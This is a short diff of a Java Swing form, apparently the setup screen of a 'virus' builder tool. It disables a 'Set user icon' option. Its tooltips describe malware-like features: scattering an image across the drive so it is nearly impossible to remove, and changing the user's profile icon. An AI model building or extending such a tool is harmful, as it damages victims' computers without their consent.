@@ -204,7 +204,8 @@ public class VirusSetupForm {
         scatterAcrossDriveCheckBox.setToolTipText("Scatter the image across the drive, makes it nearly impossible to remove them unless you use specialized tools");
         panel2.add(scatterAcrossDriveCheckBox, new GridConstraints(3, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
         setUserIconRadioButton = new JRadioButton();
-        setUserIconRadioButton.setSelected(true);
+        setUserIconRadioButton.setEnabled(false);
+        setUserIconRadioButton.setSelected(false);
         setUserIconRadioButton.setText("Set user icon");
         setUserIconRadioButton.setToolTipText("Changes the user's profile icon");
         panel2.add(setUserIconRadioButton, new GridConstraints(4, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
